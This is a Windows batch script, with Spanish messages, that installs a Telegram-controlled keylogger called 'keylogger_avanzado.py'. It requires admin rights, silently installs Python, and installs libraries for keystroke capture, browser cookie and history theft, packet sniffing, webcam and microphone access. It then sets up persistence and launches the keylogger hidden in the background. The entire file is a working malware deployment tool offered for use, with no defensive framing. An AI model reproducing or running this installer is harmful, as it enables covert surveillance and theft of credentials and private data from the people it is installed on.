@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
title Instalador Keylogger Ultimate
color 0A

cd /d "%~dp0"

echo.
echo ╔═══════════════════════════════════════════════════════════╗
echo ║        🕵️‍♂️ INSTALADOR KEYLOGGER TELEGRAM ULTIMATE        ║
echo ╚═══════════════════════════════════════════════════════════╝
echo.

:: 1. Verificar administrador
echo [1/8] Verificando permisos de administrador...
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Debe ejecutar como ADMINISTRADOR
    pause
    exit /b 1
)
echo [✓] Permisos OK

:: 2. Verificar archivo principal (keylogger_avanzado.py)
echo [2/8] Verificando keylogger_avanzado.py...
if not exist "keylogger_avanzado.py" (
    echo [ERROR] No se encuentra keylogger_avanzado.py
    pause
    exit /b 1
)
echo [✓] Archivo encontrado

:: 3. Verificar/Instalar Python
echo [3/8] Verificando Python...
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [✗] Python no encontrado. Descargando...
    if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
        set "PYTHON_URL=https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe"
    ) else (
        set "PYTHON_URL=https://www.python.org/ftp/python/3.12.3/python-3.12.3.exe"
    )
    powershell -Command "Invoke-WebRequest -Uri !PYTHON_URL! -OutFile '%TEMP%\python-installer.exe'"
    if not exist "%TEMP%\python-installer.exe" (
        echo [✗] Error al descargar Python
        pause
        exit /b 1
    )
    echo Instalando Python (puede tardar varios minutos)...
    start /wait "" "%TEMP%\python-installer.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
    del "%TEMP%\python-installer.exe"
    :: Actualizar PATH para esta sesión
    for /d %%i in ("%LOCALAPPDATA%\Programs\Python\Python*") do set "PYTHON_DIR=%%i"
    if defined PYTHON_DIR (
        set "PATH=!PYTHON_DIR!;!PYTHON_DIR!\Scripts;%PATH%"
        echo [✓] Python instalado en !PYTHON_DIR!
    ) else (
        echo [✗] No se pudo localizar Python. Intenta instalar manualmente.
        pause
        exit /b 1
    )
    python --version >nul 2>&1
    if %errorLevel% neq 0 (
        echo [✗] Falló instalación de Python
        pause
        exit /b 1
    )
    echo [✓] Python instalado
) else (
    echo [✓] Python encontrado
)

:: 4. Actualizar pip
echo [4/8] Actualizando pip...
python -m pip install --upgrade pip >nul 2>&1
echo [✓] pip actualizado

:: 5. Instalar dependencias (usando --user para evitar permisos)
echo [5/8] Instalando dependencias (puede tardar)...
set "PACKAGES=pynput requests pywin32 psutil pillow cryptography browser-cookie3 browser-history scapy opencv-python wmi dnspython pycryptodome"
for %%p in (%PACKAGES%) do (
    echo   Instalando %%p ...
    pip install --user %%p >nul 2>&1
    if !errorLevel! equ 0 (
        echo     [✓] %%p instalado
    ) else (
        echo     [⚠] %%p falló (intentando sin --user)
        pip install %%p >nul 2>&1
        if !errorLevel! equ 0 (
            echo     [✓] %%p instalado (sin --user)
        ) else (
            echo     [⚠] %%p falló completamente
        )
    )
)
echo   Instalando pyaudio...
pip install --user pyaudio >nul 2>&1
if %errorLevel% equ 0 (
    echo     [✓] pyaudio instalado
) else (
    pip install pyaudio >nul 2>&1
    if %errorLevel% equ 0 (
        echo     [✓] pyaudio instalado (sin --user)
    ) else (
        echo     [⚠] pyaudio falló (función de micrófono desactivada)
    )
)
echo [✓] Dependencias procesadas

:: 6. Configurar persistencia (usando keylogger_avanzado.py)
echo [6/8] Configurando persistencia...
python keylogger_avanzado.py --install
if %errorLevel% neq 0 (
    echo [✗] Error en persistencia
    pause
    exit /b 1
)
echo [✓] Persistencia configurada

:: 7. Iniciar keylogger
echo [7/8] Iniciando keylogger...
for /f "tokens=*" %%i in ('where pythonw 2^>nul') do set "PYTHONW=%%i"
if defined PYTHONW (
    start /B "" "!PYTHONW!" "keylogger_avanzado.py" --silent
    echo [✓] Keylogger en segundo plano (pythonw)
) else (
    start /B python keylogger_avanzado.py --silent
    echo [⚠] Usando python.exe (puede mostrar ventana)
)

:: 8. Esperar confirmación
echo [8/8] Esperando confirmación...
timeout /t 5 /nobreak >nul

echo.
echo ╔═══════════════════════════════════════════════════════════╗
echo ║      ✅ INSTALACIÓN COMPLETADA EXITOSAMENTE              ║
echo ╚═══════════════════════════════════════════════════════════╝
echo.
echo 📱 Envía /start a tu bot en Telegram para ver el menú.
echo 🗑️ Para desinstalar: python keylogger_avanzado.py --uninstall
echo.
pause